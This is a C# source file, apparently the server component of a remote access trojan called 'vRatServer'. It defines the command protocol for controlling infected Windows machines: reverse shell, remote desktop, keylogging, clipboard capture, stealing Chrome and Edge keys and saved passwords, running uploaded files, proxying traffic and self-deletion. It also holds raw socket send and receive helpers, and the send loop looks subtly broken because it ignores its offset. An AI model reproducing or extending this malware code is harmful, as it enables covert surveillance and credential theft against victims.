using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace vRatServer.Classes
{
    static public class globals
    {
        public static ImageList imageList = new ImageList();
        public enum PacketType : byte
        {
            Rdp=0x90,
            sysinfo= 0x54,
            ReverseShell =0x21,
            Proxy= 0x77,
            rdpStop=0x91,
            rdpStart= 0x90,
            rdpMouse=0x92,
            rdpKey= 0x94,
            rdpMouseHover=0x93,
            FileManagerFile=0x31,
            FileManagerDrive=0x30,
            FileManagerFileDownloadStop=0x33,
            FileManagerFileDel=0x37,
            FileManagerFileUpload=0x34,
            FileManagerFileUploadData=0x35,
            FileManagerFileDownload=0x32,
            FileManagerFileExec=0x36,
            ReverseShellStart=0x20,
            ReverseShellText = 0x21,
            ReverseShellStop=0x22,
            socksdata=0x77,
            socksconnect = 0x75,
            selfdelete=0x88,
            tasklist=0x89,
            taskkill=0x87,
            poweroff=0x86,
            sleep=0x85,
            urlvisit=0x84,
            monoff=0x81,
            monrestore=0x82,
            sleepdisable=0x83,
            sleeprestore=0x79,
            statusmon=0x01,
            sendstatus=0x02,
            sendkeylogstatus=0x07,
            startkeylog=0x04,
            sendkeylogs=0x03,
            stopkeylog=0x05,
            deletekeylogs=0x06,
            keylogs=0x08,
            keylogstatus=0x09,
            clipboardget = 0x12,
            clipboardset = 0x13,
            getwindow=0x14,
            enablebincapt=0x15,
            disablebincapt=0x16,
            sendbincaptstatus=0x17,
            capt_count = 0x18,
            getondis=0x19,
            setondis= 0x95,
            chromekey=0x41,
            edgkey=0x42,
            chromelogfile=0x43,
            edglogfile=0x44,
            getpasswords=0x45,
            zip=0x46,
            zipdone=0x47,


        }

        static public int SendPacket(Client client ,byte com,int size,ulong id,ref byte[]? buffer)
        {

            byte[] data= new byte[size+4+8+1];
            byte[] ord = { com };

            Array.Copy(BitConverter.GetBytes(size), 0, data, 0, 4);
            Array.Copy(BitConverter.GetBytes(id), 0, data, 4, 8);
            Array.Copy(ord, 0, data, 12, 1);
            if (buffer!=null) { Array.Copy(buffer, 0, data, 13, size); }
           


            int offset = 0;
            int remaining = data.Length;
            int sent = 0;
            int r = 0;
            client.SocketM.WaitOne();
            try
            {


                while (remaining > 0)
                {
                    sent = client.client.Send(data);
                    if (sent <= 0) { break; }
                    offset += sent;
                    remaining -= sent;

                }

            }
            catch (Exception e) { r = -1; }
            client.SocketM.ReleaseMutex();
            return r;
        }
        static public int ByteArrayToInt(byte[] bytes)
        {
            
            return BitConverter.ToInt32(bytes, 0);
        }
        static public int ReceiveBytesFromSocket(Socket socket, int numBytes, ref byte[] buffer)
        {

            int bytesReceived = 0;
            while (bytesReceived < numBytes)
            {
                int currentBytesReceived = socket.Receive(buffer, bytesReceived, numBytes - bytesReceived, SocketFlags.None);
                if (currentBytesReceived == 0)
                {
                    return -1;
                }
                bytesReceived += currentBytesReceived;
            }
            return bytesReceived;
        }
    }
}
